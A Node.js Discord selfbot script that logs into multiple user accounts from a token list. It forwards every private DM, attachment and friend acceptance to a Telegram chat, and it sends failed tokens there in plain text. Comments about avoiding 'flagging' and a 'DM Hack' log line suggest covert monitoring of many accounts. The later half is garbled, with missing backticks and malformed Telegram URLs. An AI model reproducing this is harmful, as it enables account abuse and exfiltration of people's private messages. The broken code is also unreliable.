const { Client } = require('discord.js-selfbot-v13');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

// ========================================================
// HYBRID ENVIRONMENT VARIABLES ENGINE (LOCAL & CLOUD SAFE)
// ========================================================
const config = {};

try {
    const envPath = path.join(__dirname, '.env');
    if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf8');
        envContent.split('\n').forEach(line => {
            const trimmedLine = line.trim();
            if (!trimmedLine || trimmedLine.startsWith('#')) return;
            
            const firstEquals = trimmedLine.indexOf('=');
            if (firstEquals === -1) return;
            
            const key = trimmedLine.substring(0, firstEquals).trim();
            const value = trimmedLine.substring(firstEquals + 1).replace(/[{}"']/g, '').trim();
            config[key] = value;
        });
    }
} catch (err) {
    console.error("Local .env reading process skipped:", err.message);
}

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || config.TELEGRAM_BOT_TOKEN || '').replace(/[{}]/g, '').trim();
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || config.TELEGRAM_CHAT_ID || '').replace(/[{}]/g, '').trim();
const RAW_TOKENS = process.env.DISCORD_TOKEN || config.DISCORD_TOKEN || '';

// Parse tokens safely by separating with commas or line breaks, and eliminating artifacts
const DISCORD_TOKENS = RAW_TOKENS ? RAW_TOKENS.split(/[,\n\r]+/).map(token => token.replace(/["'{}]/g, '').trim()).filter(t => t.length > 0) : [];

if (DISCORD_TOKENS.length === 0 || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Critical Verification Error: Missing clean variables in your .env file or Render Environment tab!");
    process.exit(1);
}
// ========================================================

const processedMessageIds = new Set(); 

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function createSelfbotInstance(token, index) {
    return new Promise((resolve) => {
        const accountNumber = index + 1;
        const cleanToken = token ? token.trim() : '';

        if (!cleanToken) {
            console.error(`❌ [Account #${accountNumber}] Skipped: Empty space detected.`);
            resolve();
            return;
        }

        const client = new Client({ checkUpdate: false });
        const knownFriends = new Set();

        client.on('ready', async () => {
            console.log(`[Account #${accountNumber}] Logged in as ${client.user.tag}`);
            
            // Sends immediate success details for each successful account login
            const statusUpdate = `✅ *[Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGGED IN!*\n\n` +
                                  `• *User:* ${client.user.tag}\n` +
                                  `• *ID:* \`${client.user.id}\``;
            await sendToTelegram(statusUpdate);

            client.relationships.friendCache.forEach((user, id) => {
                knownFriends.add(id);
            });

            resolve(); 
        });

        // ========================================================
        // ULTRA HIGH-SPEED RAW WEBSOCKET INTERCEPTOR ENGINE
        // ========================================================
        client.on('raw', async (packet) => {
            if (packet.t === 'RELATIONSHIP_ADD') {
                try {
                    const data = packet.d;
                    if (data.type === 1 && !knownFriends.has(data.id)) {
                        knownFriends.add(data.id);
                        
                        const friendUser = await client.users.fetch(data.id).catch(() => data.user);
                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw Friend Alert: ${friendUser.username || data.id}`);

                        const friendTag = friendUser.discriminator && friendUser.discriminator !== '0' 
                            ? `${friendUser.username}#${friendUser.discriminator}` 
                            : friendUser.username;

                        const alertText = `🎉 Friend Request Accepted!\n\n` +
                                          `Account: ${client.user.tag}\n` +
                                          `New Friend: ${friendTag} (${data.id})`;
                        
                        await sendToTelegram(alertText);
                    }
                } catch (e) {
                    console.error("Error processing raw relationship packet:", e.message);
                }
            }

            if (packet.t === 'MESSAGE_CREATE') {
                try {
                    const data = packet.d;
                    if (!data.guild_id && data.author.id !== client.user.id && !data.author.bot) {
                        if (processedMessageIds.has(data.id)) return;
                        processedMessageIds.add(data.id);

                        setTimeout(() => processedMessageIds.delete(data.id), 60000);

                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw DM Hack Intercepted!`);

                        const channel = await client.channels.fetch(data.channel_id).catch(() => null);
                        if (channel) {
                            try {
                                const message = await channel.messages.fetch(data.id);
                                if (message) {
                                    await handleValidDM(client, message);
                                }
                            } catch (fetchErr) {
                                console.error(`[${client.user.username || 'Selfbot'}] Could not fetch message details via raw packet:`, fetchErr.message);
                            }
                        }
                    }
                } catch (e) {
                    console.error("Error inside raw DM packet parser:", e.message);
                }
            }
        });

        // Fallback standard DM Listener
        client.on('messageCreate', async (message) => {
            if (message.channel.type !== 'DM' && message.channel.type !== 1) return;
            if (processedMessageIds.has(message.id)) return; 
            
            processedMessageIds.add(message.id);
            setTimeout(() => processedMessageIds.delete(message.id), 60000);

            if (!message.author.bot && message.author.id !== client.user.id) {
                await handleValidDM(client, message);
            }
        });

        // Fallback standard relationship indicators
        client.on('relationshipAdd', async (relationship) => {
            try {
                if (relationship.type === 'friend' && !knownFriends.has(relationship.id)) {
                    knownFriends.add(relationship.id);
                    const friendUser = relationship.user;
                    console.log(`[${client.user.username}] Friend acceptance verified via fallback: ${friendUser.tag}`);

                    const alertText = `🎉 Friend Request Accepted!\n\n` +
                                      `Account: ${client.user.tag}\n` +
                                      `New Friend: ${friendUser.tag} (${friendUser.id})`;
                    await sendToTelegram(alertText);
                }
            } catch (error) {
                console.error(`[${client.user.username || 'Unknown'}] Error in fallback relationshipAdd tracking:`, error);
            }
        });

        client.on('userUpdate', async () => {
            try {
                client.relationships.friendCache.forEach(async (friendUser, friendId) => {
                    if (!knownFriends.has(friendId)) {
                        knownFriends.add(friendId);
                        const alertText = `🎉 Friend Request Accepted!\n\n` +
                                          `Account: ${client.user.tag}\n` +
                                          `New Friend: ${friendUser.tag} (${friendId})`;
                        await sendToTelegram(alertText);
                    }
                });
            } catch (error) {
                console.error(`[${client.user.username || 'Unknown'}] Error in fallback userUpdate friend tracking:`, error);
            }
        });

        // Authenticate token with Catch layer to catch bad tokens
        client.login(cleanToken).catch(async (err) => {
            console.error(`❌ [Account #${accountNumber}] Failed login.`);
            
            // Send exact faulty token and account slot back to telegram securely
            const failureReport = `❌ *[Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGIN FAILED!*\n\n` +
                                  `• *Error:* ${err.message}\n` +
                                  `• *Faulty Token:* \`${cleanToken}\``;
            
            await sendToTelegram(failureReport);
            resolve(); 
        });
    });
}

async function handleValidDM(client, message) {
    try {
        console.log(`[${client.user.username}] Forwarding validated DM to Telegram...`);
        
        let text = `🎉 New Message Alert\nDM to ${client.user.tag} \nfrom ${message.author.tag} \n(${message.author.id}):`;
        if (message.content) {
            text += `\n${message.content}`;
        }
        
        if (message.attachments.size > 0) {
            for (const attachment of message.attachments.values()) {
                if (attachment.contentType && attachment.contentType.startsWith('image/')) {
                    await sendImageToTelegram(attachment.url, text);
                } else {
                    text += `\n📎 Attachment: ${attachment.name}\n🔗 ${attachment.url}`;
                }
            }
            if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
                await sendToTelegram(text);
            }
        } else {
await sendToTelegram(text);
}
} catch (err) {
console.error("Error inside handleValidDM router:", err.message);
}
}

// Sequential Execution Loop
async function bootSequence() {
console.log(🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...);
await sendToTelegram(🚀 Starting boot initialization for ${DISCORD_TOKENS.length} tokens...);
for (let i = 0; i < DISCORD_TOKENS.length; i++) {
await createSelfbotInstance(DISCORD_TOKENS[i], i);
// 2.5 second delay to preserve API integrity and prevent flagging
await sleep(2500);
}
console.log(\n🏁 Verification completed.);
}
bootSequence();
// --- Telegram helper functions ---
async function sendImageToTelegram(imageUrl, caption) {
if (!TELEGRAM_CHAT_ID) return;
try {
const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto;
const response = await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: TELEGRAM_CHAT_ID,
photo: imageUrl,
caption: caption
})
});
const result = await response.json();
if (!result.ok) {
console.error('Telegram API error (image):', result);
await sendToTelegram(caption + \n\n🖼️ Image URL: ${imageUrl});
}
} catch (error) {
console.error('Error sending image to Telegram:', error);
await sendToTelegram(caption + \n\n🖼️ Image URL: ${imageUrl});
}
}
async function sendToTelegram(text) {
if (!TELEGRAM_CHAT_ID) return;
try {
const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage;
const response = await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: TELEGRAM_CHAT_ID,
text: text,
parse_mode: "Markdown"
})
});
const result = await response.json();
if (!result.ok) console.error('Telegram API error:', result);
} catch (error) {
console.error('Error sending to Telegram:', error);
}
}
